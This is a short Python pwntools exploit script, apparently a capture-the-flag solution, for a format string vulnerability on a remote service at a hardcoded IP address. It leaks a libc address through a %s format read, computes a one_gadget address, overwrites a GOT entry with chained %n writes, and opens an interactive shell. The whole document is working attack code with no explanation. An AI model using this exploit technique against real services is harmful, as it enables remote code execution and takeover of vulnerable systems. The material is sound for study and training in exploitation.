from pwn import *
import sys

context.arch="amd64"

x = 0x601028

r = remote("47.75.182.113", 9999)
offset = 6

r.sendline("%17$s   "+"aaaaaaaa"*10+p64(x))
libc = u64(r.recvuntil(" ")[:-1].ljust(8,'\x00'))-0x6ed80
print hex(libc)
one_get = libc+0x45216
#one_get = 0xeeeeffffccccdddd
r.recvrepeat(1)
#x+=0x300
a = one_get&0xffff
one_get>>=16

j = one_get&0xffff
b = (j-a)%0x10000
if b==0:
	b = 0x10000
one_get>>=16

c = ((one_get&0xffff)-j)%0x10000
j = one_get&0xffff
if c==0:
        c = 0x10000
one_get>>=16

d = ((one_get&0xffff)-j)%0x10000
if d==0:
        d = 0x10000



fmt_s = "%{}c%12$n%{}c%13$n%{}c%14$n%{}c%15$n".format("%05d"%(a),"%05d"%(b),"%05d"%(c),"%05d"%(d))
r.sendline(fmt_s+p64(x)+p64(x+2)+p64(x+4)+p64(x+6))
r.interactive()
r.recvrepeat(1)

r.sendline("%7$s    "+p64(x))
val = u64(r.recvuntil(" ")[:-1].ljust(8,'\x00'))
print hex(val)
print hex(libc+0x4526a)
r.interactive()
